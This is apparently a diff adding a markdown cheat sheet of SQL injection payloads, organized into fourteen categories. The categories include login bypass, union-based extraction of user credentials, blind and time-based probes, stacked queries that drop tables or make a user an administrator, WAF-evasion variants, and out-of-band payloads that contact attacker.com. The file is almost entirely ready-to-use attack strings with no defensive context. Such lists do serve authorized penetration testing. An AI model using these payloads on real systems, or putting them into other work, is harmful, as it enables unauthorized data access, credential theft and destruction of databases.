@@ -1,0 +1,169 @@
+# 🧨 COMPLETE SQL INJECTION PAYLOAD LIST (CATEGORIZED)
+
+---
+
+## 📌 **1. Basic Detection Payloads**
+
+1. `' OR '1'='1`
+2. `' OR 1=1--`
+3. `' OR 1=1#`
+4. `' OR 1=1/*`
+5. `" OR "1"="1`
+6. `') OR ('1'='1`
+7. `' AND '1'='1`
+8. `' AND 1=1--`
+9. `' OR 'a'='a`
+10. `admin' --`
+
+---
+
+## 📌 **2. Error-Based Payloads**
+
+1. `' AND 1=CONVERT(int, (SELECT @@version))--`
+2. `' AND 1=(SELECT COUNT(*) FROM sysobjects)--`
+3. `' AND (SELECT 1 FROM dual WHERE 1=1) --`
+4. `' AND 1=CAST((SELECT user()) AS INT)--`
+5. `'||(SELECT 1/0 FROM dual)||'`
+
+---
+
+## 📌 **3. Union-Based Payloads**
+
+1. `' UNION SELECT NULL--`
+2. `' UNION SELECT NULL,NULL--`
+3. `' UNION SELECT 1,2,3--`
+4. `' UNION SELECT username, password FROM users--`
+5. `' UNION ALL SELECT NULL, version()--`
+6. `' UNION SELECT table_name FROM information_schema.tables--`
+7. `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
+
+---
+
+## 📌 **4. Boolean-Based Blind Payloads**
+
+1. `' AND 1=1--` ✅
+2. `' AND 1=2--` ❌
+3. `' OR 1=1--`
+4. `' AND 'a'='a'--`
+5. `' AND ASCII(SUBSTRING(@@version,1,1))=77--`
+
+---
+
+## 📌 **5. Time-Based Blind SQLi Payloads**
+
+| DBMS       | Payload                                               |
+|------------|--------------------------------------------------------|
+| MySQL      | `' OR IF(1=1, SLEEP(5), 0)--`                         |
+| MSSQL      | `' WAITFOR DELAY '00:00:05'--`                        |
+| PostgreSQL | `' OR pg_sleep(5)--`                                  |
+| Oracle     | `' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NULL--` |
+
+---
+
+## 📌 **6. Stacked Queries (if supported)**
+
+1. `'; DROP TABLE users--`
+2. `1; SELECT user()--`
+3. `0'; UPDATE users SET is_admin=1 WHERE username='admin'--`
+
+> Note: Stacked queries often require special DB configuration (like MSSQL or PostgreSQL).
+
+---
+
+## 📌 **7. Out-of-Band (OOB) SQLi Payloads**
+
+1. `'; EXEC master..xp_dirtree '\\attacker.com\share'--` (MSSQL)
+2. `' OR LOAD_FILE('\\\\attacker.com\\payload')--` (MySQL)
+3. `' UNION SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/">]>'),'/l') FROM dual--` (Oracle XXE-SQLi combo)
+
+---
+
+## 📌 **8. Bypass Filter Payloads**
+
+1. `%27 OR 1=1--` *(URL Encoded `'`)*
+2. `%27%20OR%201=1--`
+3. `'/**/OR/**/1=1--`
+4. `' OR 1=1 LIMIT 1 OFFSET 1--`
+5. `' OR '1'='1' /*`
+
+---
+
+## 📌 **9. WAF Bypass Payloads**
+
+1. `'/*!50000UNION*/ SELECT NULL--`
+2. `' OR 1=1-- -`
+3. `' OR 1=1#`
+4. `' AND 1=1 AND '1'='1'--`
+5. `' OR 1=1 AND SLEEP(0)--`
+
+---
+
+## 📌 **10. Database-Specific Payloads**
+
+### 🔹 MySQL
+1. `' AND SLEEP(5)--`
+2. `' UNION SELECT user(), database()--`
+3. `' UNION SELECT table_schema FROM information_schema.schemata--`
+
+### 🔹 MSSQL
+1. `' UNION SELECT system_user--`
+2. `' WAITFOR DELAY '00:00:05'--`
+3. `' AND EXISTS(SELECT * FROM sysobjects)--`
+
+### 🔹 PostgreSQL
+1. `' OR pg_sleep(5)--`
+2. `' UNION SELECT current_user--`
+
+### 🔹 Oracle
+1. `' OR 1=1 AND ROWNUM=1--`
+2. `' UNION SELECT banner FROM v$version--`
+
+---
+
+## 📌 **11. Login Bypass Payloads**
+
+1. `' OR 1=1--`
+2. `' OR 'a'='a`
+3. `' OR 1=1#`
+4. `' OR 1=1/*`
+5. `' OR 1=1 LIMIT 1--`
+
+---
+
+## 📌 **12. Numeric Injection Payloads**
+
+1. `1 OR 1=1--`
+2. `1 UNION SELECT NULL--`
+3. `1; DROP TABLE users--`
+4. `1 OR SLEEP(5)--`
+5. `1 AND 1=2 UNION SELECT user()--`
+
+---
+
+## 📌 **13. Payloads for Testing Columns (Column Count)**
+
+1. `' ORDER BY 1--`
+2. `' ORDER BY 2--`
+3. `' ORDER BY 3--`
+4. `' UNION SELECT 1--`
+5. `' UNION SELECT 1,2--`
+6. `' UNION SELECT 1,2,3--`
+
+---
+
+## 📌 **14. SQL Injection in JSON**
+
+```json
+{
+  "user": "' OR '1'='1",
+  "password": "' OR 1=1--"
+}
+```
+
+```json
+{
+  "id": "1 OR SLEEP(5)"
+}
+```
+
+---
